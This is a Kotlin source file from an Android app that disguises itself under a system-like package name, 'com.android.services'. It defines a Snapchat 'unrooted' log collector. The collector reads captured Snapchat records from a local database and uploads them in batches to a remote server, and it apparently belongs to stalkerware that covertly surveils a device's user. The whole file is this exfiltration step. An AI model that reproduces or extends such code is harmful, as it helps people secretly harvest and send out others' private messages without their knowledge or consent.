package com.android.services.logs.collectors.im.unrooted


import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerThreeApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose

class SnapChatUnrootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncSnapchat) {
            try {
                logVerbose("${AppConstants.SNAP_CHAT_UNROOTED_TYPE} preparing to sync")
                val snapChatList = localDatabaseSource.selectSnapchatUnrooteds()
                if (snapChatList.isNotEmpty()) {
                    val endId = snapChatList[snapChatList.size - 1].id
                    val startId = snapChatList[0].id
                    val mSnapChatSender = RemoteServerHelper(
                        context,
                        AppConstants.SNAP_CHAT_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startId = startId,
                        endId = endId
                    )
                    mSnapChatSender.upload(snapChatList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.SNAP_CHAT_UNROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.SNAP_CHAT_UNROOTED_TYPE} Sync is Off")
        }
    }
}